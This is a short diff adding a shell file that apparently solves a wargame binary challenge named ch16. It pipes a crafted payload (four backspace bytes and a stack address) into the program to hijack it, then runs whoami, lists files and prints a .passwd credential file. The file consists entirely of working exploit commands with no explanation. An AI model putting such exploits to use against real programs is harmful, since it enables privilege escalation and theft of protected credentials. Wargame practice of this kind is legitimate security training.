@@ -1,0 +1,5 @@
+cat <(python -c 'print "\x08"*4 + "\xbc\xfa\xff\xbf"') - | ./ch16
+whoami
+ls -la
+cat .passwd
+
